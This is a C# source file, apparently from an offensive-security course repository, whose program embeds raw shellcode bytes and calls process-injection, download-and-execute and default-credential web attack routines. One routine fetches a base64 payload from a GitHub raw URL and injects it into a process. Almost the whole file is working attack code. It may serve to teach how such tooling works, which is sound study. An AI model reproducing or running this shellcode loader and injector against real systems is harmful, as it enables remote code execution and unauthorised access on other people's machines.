using System;

namespace session2
{
    class Program
    {
        private static readonly byte[] shell = {
                0xbf,0x49,0xe1,0x34,0x4e,0xdb,0xc7,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,
                0x31,0x83,0xc3,0x04,0x31,0x7b,0x0f,0x03,0x7b,0x46,0x03,0xc1,0xb2,0xb0,0x41,
                0x2a,0x4b,0x40,0x26,0xa2,0xae,0x71,0x66,0xd0,0xbb,0x21,0x56,0x92,0xee,0xcd,
                0x1d,0xf6,0x1a,0x46,0x53,0xdf,0x2d,0xef,0xde,0x39,0x03,0xf0,0x73,0x79,0x02,
                0x72,0x8e,0xae,0xe4,0x4b,0x41,0xa3,0xe5,0x8c,0xbc,0x4e,0xb7,0x45,0xca,0xfd,
                0x28,0xe2,0x86,0x3d,0xc2,0xb8,0x07,0x46,0x37,0x08,0x29,0x67,0xe6,0x03,0x70,
                0xa7,0x08,0xc0,0x08,0xee,0x12,0x05,0x34,0xb8,0xa9,0xfd,0xc2,0x3b,0x78,0xcc,
                0x2b,0x97,0x45,0xe1,0xd9,0xe9,0x82,0xc5,0x01,0x9c,0xfa,0x36,0xbf,0xa7,0x38,
                0x45,0x1b,0x2d,0xdb,0xed,0xe8,0x95,0x07,0x0c,0x3c,0x43,0xc3,0x02,0x89,0x07,
                0x8b,0x06,0x0c,0xcb,0xa7,0x32,0x85,0xea,0x67,0xb3,0xdd,0xc8,0xa3,0x98,0x86,
                0x71,0xf5,0x44,0x68,0x8d,0xe5,0x27,0xd5,0x2b,0x6d,0xc5,0x02,0x46,0x2c,0x83,
                0xd5,0xd4,0x4a,0xe1,0xd6,0xe6,0x54,0x55,0xbf,0xd7,0xdf,0x3a,0xb8,0xe7,0x35,
                0x7f,0x36,0xa2,0x14,0x29,0xdf,0x6b,0xcd,0x68,0x82,0x8b,0x3b,0xae,0xbb,0x0f,
                0xce,0x4e,0x38,0x0f,0xbb,0x4b,0x04,0x97,0x57,0x21,0x15,0x72,0x58,0x96,0x16,
                0x57,0x3b,0x79,0x85,0x3b,0x92,0x1c,0x2d,0xd9,0xea
            };

        private static readonly string url = "https://raw.githubusercontent.com/gaurav-gogia/offensive_cs/main/session2/shell";

        static void Main()
        {
            //JustRun();
            //DownloadAndRun();
            Attack();
        }

        private static void JustRun()
        {
            ProcessInjector injector = new ProcessInjector();
            injector.Inject(shell);
        }

        private static void DownloadAndRun()
        {
            Downloader downloader = new Downloader();
            ProcessInjector injector = new ProcessInjector();

            string shellstring = downloader.Download(url);
            byte[] shellbyte = Convert.FromBase64String(shellstring);

            injector.Inject(shellbyte);
        }

        private static void Attack()
        {
            WebAttacker attacker = new WebAttacker();
            attacker.DefaultCredsAttack(url);
        }
    }
}
